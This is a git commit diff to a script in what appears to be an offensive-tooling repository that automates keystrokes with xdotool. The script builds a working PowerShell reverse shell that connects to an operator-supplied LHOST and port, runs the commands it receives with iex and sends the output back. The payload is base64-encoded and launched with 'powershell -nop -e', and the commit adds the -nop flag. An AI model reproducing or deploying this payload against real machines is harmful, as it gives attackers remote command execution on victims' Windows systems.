8f98b174c8c01d9be9e83425fbf23e9c4343de99
Danny van der Knaap <dvdknaap@users.noreply.github.com>
2025-04-04 02:49:18 -0400

    feat(bash): new scripts (#128)

--- code/xdotool/scripts/shell/windows/powershell_reverse_shell_base64.sh
+++ code/xdotool/scripts/shell/windows/powershell_reverse_shell_base64.sh
@@ -15,4 +15,4 @@ LHOST=${form_data["lhost"]}
 PORT=${form_data["port"]}
 
 REV_SHELL=$(echo "\$client = New-Object System.Net.Sockets.TCPClient(\"${LHOST}\",${PORT});\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + \"PS \" + (pwd).Path + \"> \";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()" | iconv -t UTF-16LE | base64 -w 0)
-execute_command "powershell -e ${REV_SHELL}"
+execute_command "powershell -nop -e ${REV_SHELL}"
